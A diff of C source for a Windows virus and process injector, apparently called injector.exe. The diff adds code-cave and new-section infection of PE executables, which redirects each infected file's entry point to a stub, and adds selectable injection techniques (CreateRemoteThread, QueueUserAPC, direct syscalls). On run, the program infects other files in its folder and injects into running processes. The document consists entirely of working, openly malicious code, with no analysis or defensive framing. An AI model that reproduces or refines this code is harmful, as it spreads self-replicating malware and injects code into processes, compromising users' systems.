     for (WORD i = 0; i < nsec; i++) {
         if (!_stricmp((char*)secs[i].Name, VIRUS_SECTION_NAME)) {
             printf("[DEBUG] Already infected: %s\n", path);
+            free(fileData);
             free(secs);
             CloseHandle(hFile);
             return FALSE;
         }
     }
 
-    // build new section header
-    IMAGE_SECTION_HEADER newSec = { 0 };
-    memcpy(newSec.Name, VIRUS_SECTION_NAME, IMAGE_SIZEOF_SHORT_NAME);
-    DWORD fa = nt.OptionalHeader.FileAlignment,
-        sa = nt.OptionalHeader.SectionAlignment;
-    IMAGE_SECTION_HEADER* last = &secs[nsec - 1];
-    DWORD endVA = last->VirtualAddress + max(last->Misc.VirtualSize, last->SizeOfRawData);
-    DWORD newRVA = (endVA + sa - 1) & ~(sa - 1);
-    DWORD fileEnd = GetFileSize(hFile, NULL);
-    DWORD newPtr = (fileEnd + fa - 1) & ~(fa - 1);
+    DWORD entryOffset = 0;
+    if (RvaToFileOffset(secs, nsec, nt.OptionalHeader.AddressOfEntryPoint, &entryOffset) &&
+        entryOffset + STATIC_STUB_SIZE <= fileEnd) {
+        if (memcmp(
+            fileData + entryOffset + (STATIC_STUB_SIZE - STATIC_STUB_SIGNATURE_SIZE),
+            STATIC_STUB_SIGNATURE,
+            STATIC_STUB_SIGNATURE_SIZE) == 0) {
+            printf("[DEBUG] Already infected (signature): %s\n", path);
+            free(fileData);
+            free(secs);
+            CloseHandle(hFile);
+            return FALSE;
+        }
+    }
 
-    DWORD shellSize;
-    void* shell = LoadShellcode(&shellSize);
-    if (!shell) {
-        printf("[ERROR] LoadShellcode in InfectFile failed\n");
+    BYTE staticStub[STATIC_STUB_SIZE];
+    DWORD originalEntryRva = nt.OptionalHeader.AddressOfEntryPoint;
+    if (!BuildStaticStub(staticStub, sizeof(staticStub), originalEntryRva)) {
+        printf("[ERROR] BuildStaticStub failed\n");
+        free(fileData);
         free(secs);
         CloseHandle(hFile);
         return FALSE;
     }
 
-    newSec.Misc.VirtualSize = shellSize;
+    if (!useSection) {
+        DWORD caveRva = 0;
+        DWORD caveOffset = 0;
+        if (!FindCodeCave(secs, nsec, fileData, fileEnd, sizeof(staticStub), &caveRva, &caveOffset)) {
+            printf("[ERROR] No suitable code cave found for %s\n", path);
+            free(fileData);
+            free(secs);
+            CloseHandle(hFile);
+            return FALSE;
+        }
+
+        nt.OptionalHeader.AddressOfEntryPoint = caveRva;
+        SetFilePointer(hFile, dos.e_lfanew, NULL, FILE_BEGIN);
+        if (!WriteFile(hFile, &nt, sizeof(nt), &rd, NULL)) {
+            printf("[ERROR] WriteFile NT headers failed\n");
+            free(fileData);
+            free(secs);
+            CloseHandle(hFile);
+            return FALSE;
+        }
+
+        SetFilePointer(hFile, caveOffset, NULL, FILE_BEGIN);
+        if (!WriteFile(hFile, staticStub, sizeof(staticStub), &rd, NULL)) {
+            printf("[ERROR] WriteFile cave payload failed\n");
+            free(fileData);
+            free(secs);
+            CloseHandle(hFile);
+            return FALSE;
+        }
+
+        printf("[DEBUG] Successfully infected (code cave): %s\n", path);
+        free(fileData);
+        free(secs);
+        CloseHandle(hFile);
+        return TRUE;
+    }
+
+    DWORD headerEnd = dos.e_lfanew + offsetof(IMAGE_NT_HEADERS64, OptionalHeader) + optSize +
+        ((nsec + 1) * sizeof(*secs));
+    DWORD firstSectionOffset = secs[0].PointerToRawData;
+    for (WORD i = 1; i < nsec; i++) {
+        if (secs[i].PointerToRawData < firstSectionOffset) {
+            firstSectionOffset = secs[i].PointerToRawData;
+        }
+    }
+    if (firstSectionOffset < headerEnd) {
+        printf("[ERROR] Not enough header slack to add section header\n");
+        free(fileData);
+        free(secs);
+        CloseHandle(hFile);
+        return FALSE;
+    }
+
+    IMAGE_SECTION_HEADER newSec = { 0 };
+    memcpy(newSec.Name, VIRUS_SECTION_NAME, IMAGE_SIZEOF_SHORT_NAME);
+    DWORD fa = nt.OptionalHeader.FileAlignment;
+    DWORD sa = nt.OptionalHeader.SectionAlignment;
+    IMAGE_SECTION_HEADER* last = &secs[nsec - 1];
+    DWORD endVA = last->VirtualAddress + max(last->Misc.VirtualSize, last->SizeOfRawData);
+    DWORD newRVA = AlignUp(endVA, sa);
+    DWORD newPtr = AlignUp(fileEnd, fa);
+
+    newSec.Misc.VirtualSize = sizeof(staticStub);
     newSec.VirtualAddress = newRVA;
-    newSec.SizeOfRawData = (shellSize + fa - 1) & ~(fa - 1);
+    newSec.SizeOfRawData = AlignUp(sizeof(staticStub), fa);
     newSec.PointerToRawData = newPtr;
     newSec.Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;
 
     nt.FileHeader.NumberOfSections++;
     nt.OptionalHeader.AddressOfEntryPoint = newRVA;
-    nt.OptionalHeader.SizeOfImage = ((newRVA + shellSize + sa - 1) & ~(sa - 1));
+    nt.OptionalHeader.SizeOfImage = AlignUp(newRVA + sizeof(staticStub), sa);
 
     SetFilePointer(hFile, dos.e_lfanew, NULL, FILE_BEGIN);
     WriteFile(hFile, &nt, sizeof(nt), &rd, NULL);
@@ -634,20 +1166,35 @@ static BOOL InfectFile(const char* path) {
     if (newPtr > fileEnd) {
         DWORD pad = newPtr - fileEnd;
         BYTE* zero = calloc(pad, 1);
+        if (!zero) {
+            printf("[ERROR] calloc failed\n");
+            free(fileData);
+            free(secs);
+            CloseHandle(hFile);
+            return FALSE;
+        }
         SetFilePointer(hFile, 0, NULL, FILE_END);
         WriteFile(hFile, zero, pad, &rd, NULL);
         free(zero);
     }
 
     SetFilePointer(hFile, newPtr, NULL, FILE_BEGIN);
-    WriteFile(hFile, shell, shellSize, &rd, NULL);
+    WriteFile(hFile, staticStub, sizeof(staticStub), &rd, NULL);
 
-    printf("[DEBUG] Successfully infected: %s\n", path);
+    printf("[DEBUG] Successfully infected (new section): %s\n", path);
+    free(fileData);
     free(secs);
     CloseHandle(hFile);
     return TRUE;
 }
 
+
+static void PrintUsage(const char* exeName) {
+    printf("Usage: %s [--technique crt|apc|syscall] [--section]\n", exeName);
+    printf("  --technique: crt=CreateRemoteThread, apc=QueueUserAPC, syscall=Nt* memory ops\n");
+    printf("  --section: use new section infection instead of code cave\n");
+    printf("  Options can be combined (e.g. --technique apc --section)\n");
+}
 
 /**
  * \fn int main(void)
@@ -655,8 +1202,42 @@ static BOOL InfectFile(const char* path) {
  *
  * \return Exit code (0 on success, non-zero on error).
  */
-int main(void) {
+int main(int argc, char** argv) {
     printf("[DEBUG] Lancement injector.exe\n");
+
+    INJECTION_TECHNIQUE technique = INJECT_TECHNIQUE_CRT;
+    BOOL useSection = FALSE;
+    for (int i = 1; i < argc; i++) {
+        if (!_stricmp(argv[i], "--technique") && i + 1 < argc) {
+            const char* value = argv[++i];
+            if (!_stricmp(value, "crt")) {
+                technique = INJECT_TECHNIQUE_CRT;
+            }
+            else if (!_stricmp(value, "apc")) {
+                technique = INJECT_TECHNIQUE_APC;
+            }
+            else if (!_stricmp(value, "syscall")) {
+                technique = INJECT_TECHNIQUE_SYSCALL;
+            }
+            else {
+                printf("[ERROR] Unknown technique: %s\n", value);
+                PrintUsage(argv[0]);
+                return 1;
+            }
+        }
+        else if (!_stricmp(argv[i], "--section")) {
+            useSection = TRUE;
+        }
+        else if (!_stricmp(argv[i], "--help") || !_stricmp(argv[i], "-h")) {
+            PrintUsage(argv[0]);
+            return 0;
+        }
+        else {
+            printf("[ERROR] Unknown option: %s\n", argv[i]);
+            PrintUsage(argv[0]);
+            return 1;
+        }
+    }
 
     char selfPath[MAX_PATH];
     GetModuleFileNameA(NULL, selfPath, MAX_PATH);
@@ -668,7 +1249,7 @@ int main(void) {
     if (hFind != INVALID_HANDLE_VALUE) {
         do {
             if (_stricmp(fd.cFileName, selfName) != 0) {
-                InfectFile(fd.cFileName);
+                InfectFile(fd.cFileName, useSection);
             }
         } while (FindNextFileA(hFind, &fd));
         FindClose(hFind);
@@ -677,7 +1258,7 @@ int main(void) {
     DWORD pid = FindTargetPid(TARGET_PROCESS_NAME);
     if (pid) {
         printf("[DEBUG] Found %s (PID=%u), injecting...\n", TARGET_PROCESS_NAME, pid);
-        if (InjectPid(pid)) {
+        if (InjectPid(pid, technique)) {
             printf("[DEBUG] Injection succeeded for %s (PID=%u)\n", TARGET_PROCESS_NAME, pid);
             goto done;
         }
@@ -696,21 +1277,23 @@ int main(void) {
         return 1;
     }
 
-    while (Process32Next(processSnapshot, &pe)) {
+    if (!Process32First(processSnapshot, &pe)) {
+        printf("[ERROR] Process32First failed\n");
+        CloseHandle(processSnapshot);
+        return 1;
+    }
+    do {
         if (_stricmp(pe.szExeFile, selfName) == 0)
             continue;
-        if (InjectPid(pe.th32ProcessID)) {
+        if (InjectPid(pe.th32ProcessID, technique)) {
             printf("[DEBUG] Injection succeeded for %s (PID=%u)\n",
                 pe.szExeFile, pe.th32ProcessID);
             break;
         }
-    }
+    } while (Process32Next(processSnapshot, &pe));
     CloseHandle(processSnapshot);
 
 done:
     printf("[DEBUG] Fin \n");
     return 0;
 }
-
-
-
